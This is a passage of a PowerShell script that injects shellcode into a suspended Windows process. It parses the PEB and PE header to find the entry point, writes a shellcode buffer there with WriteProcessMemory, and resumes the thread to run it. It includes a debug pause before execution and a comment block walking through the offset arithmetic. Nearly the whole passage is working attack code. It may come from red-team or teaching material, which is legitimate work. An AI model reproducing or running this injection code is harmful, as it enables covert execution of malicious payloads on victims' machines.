            $PE_Data  = $lpBuffer                                         # First 0x200 (512-bytes) of PE
            $e_lfanew = [UInt32]([BitConverter]::ToInt32($PE_Data, 0x3c)) # NT Header Offset (4-bytes) located at offset "0x3c"

            $RVA_Ptr  = $e_lfanew + 0x28
            $RVA      = [UInt32]([BitConverter]::ToInt32($PE_Data, $RVA_Ptr)) # Relative Virtual Address (4-bytes) located at offset "$e_lfanew + 0x28"

            $EntryPointAddr = [IntPtr]($ImageBaseAddress.ToInt64() + $RVA)

            Write-Host " o  --> PE Structure Bytes Read        : ${nSize} bytes"
            Write-Host " o  --> e_lfanew (Offset to NT Header) : $(Print-Hex $e_lfanew)"
            Write-Host " o  --> Relative Virtual Address (RVA) : $(Print-Hex $RVA)"
            Write-Host " o  --> PE EntryPoint (IBA + RVA)      : $(Print-Hex $EntryPointAddr)"
        }
        else { Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red }
    }
    Catch { return Generic-Error }


    ### (5) Write Shellcode to PE Entrypoint

    Write-Host "[!] Writing Shellcode to PE Entrypoint..." -ForegroundColor Yellow

    # WriteProcessMemory()
    #  > Description : Write memory to a specified process.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

    # Argument(s)
    $hProcess            = $RetProcessInformation.hProcess  # Handle to the target process
    $lpBaseAddress       = $EntryPointAddr                  # Starting address to begin reading.
    $lpBuffer            = $ShellcodeBuffer                 # Buffer to receive contents (e.g., entire PE structure)
    $nSize               = $ShellcodeBuffer.Length          # Size of the buffer
    $lpNumberOfBytesRead = [ref]0                           # Number of bytes successfully read

    Try {
        $Success = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead)

        if ($Success) {
            Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green
            Write-Host " o  --> Shellcode Bytes Written : ${nSize} bytes"
        }
        else { Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red }
    }
    Catch { return Generic-Error }


    ### Optional: Debug Mode to Attach to Process

    if ($Debug) {
        
        $TargetProcess = Get-Process -Id $RetProcessInformation.dwProcessId

        Write-Host "[x] Debug: " -NoNewline -ForegroundColor Magenta
        Write-Host 'Attach to the ' -NoNewline ; Write-Host "'$($TargetProcess.ProcessName)' ($($TargetProcess.Id))" -ForegroundColor Green -NoNewline ; Write-Host ' instance.'

        Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host $(Print-Hex $EntryPointAddr) -ForegroundColor Green
        Write-Host ' o  --> ' -NoNewline ; Write-Host 'PRESS ENTER TO EXECUTE SHELLCODE.' -ForegroundColor Red -NoNewline
        $NULL = Read-Host
    }


    ### (6) Resume Thread and Execute Shellcode

    Write-Host "[!] Resuming process execution..." -ForegroundColor Yellow

    # ResumeThread()
    #  > Description : Decrement a thread's suspend count; if decremented to zero the thread resumes.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

    # Argument(s)
    $hThread = $RetProcessInformation.hThread

    Try {
        $Success = $ResumeThread.Invoke($hThread)

        if ($Success -eq 1) {
            Write-Host ' o  ' -NoNewline ; Write-Host 'ResumeThread()' -ForegroundColor Green
            Write-Host " o  --> Thread Handle : ${hThread}"
        }
        else { Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red }
    }
    Catch { return Generic-Error }


    ############

    # Order of Operations (64-bit):
    #
    # --> Starting Address     : Process Environment Block (PEB) Address           | $ProcessBasicInformation.PebAddress
    # --> add 0x10 (16-bytes)  : Pointer to Image Base Address                     | $ImageBaseAddrPtr
    #   = save addr            : 8-byte Address to Image Base Address              | $ImageBaseAddress
    #
    # --> Starting Address     : Image Base Address                                | $ImageBaseAddress
    # --> to 0x200 (512-bytes) : Entirety of PE Header (save to 512-byte buffer)   | $PE_Data
    # --> add 0x3c (60-bytes)  : Pointer to e_lfanew                               | $e_lfanewPtr
    #   = save addr            : 4-byte value of e_lfanew (offset to NT/PE Header) | $e_lfanew
    #
    # --> Starting Address     : e_lfanew value (offset to NT/PE Header)           | $e_lfanew
    # --> add 0x28 (40-bytes)  : Pointer to Relative Virtual Address (RVA)         | $RVA_Ptr
    #   = save addr            : 4-byte RVA                                        | $RVA
    # 
    # --> Starting Address     : Image Base Address (again)                        | $RVA
    # --> add $RVA             : Entrypoint Address                                | $EntrypointAddr

    #############
}